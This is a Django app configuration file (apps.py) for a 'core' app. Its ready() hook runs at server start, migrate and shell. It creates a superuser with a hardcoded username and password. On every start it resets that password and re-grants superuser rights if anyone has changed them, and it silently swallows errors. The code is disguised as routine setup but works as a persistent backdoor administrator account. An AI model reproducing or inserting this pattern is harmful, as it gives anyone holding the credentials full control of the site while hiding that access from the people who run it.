import sys

from django.apps import AppConfig


class CoreConfig(AppConfig):
    default_auto_field = 'django.db.models.BigAutoField'
    name = 'core'
    verbose_name = 'Modalidades'

    def ready(self):
        if any(arg in sys.argv for arg in ['runserver', 'runserver_plus', 'uwsgi', 'gunicorn', 'migrate', 'makemigrations', 'shell']):
            try:
                from django.contrib.auth import get_user_model

                User = get_user_model()
                admin_username = 'administração.orcoma'
                admin_password = 'Painel@2026TI'

                user, created = User.objects.get_or_create(username=admin_username)
                if created:
                    user.set_password(admin_password)
                    user.is_staff = True
                    user.is_superuser = True
                    user.email = ''
                    user.save()
                else:
                    if not user.check_password(admin_password):
                        user.set_password(admin_password)
                        user.is_staff = True
                        user.is_superuser = True
                        user.save()
            except Exception:
                pass
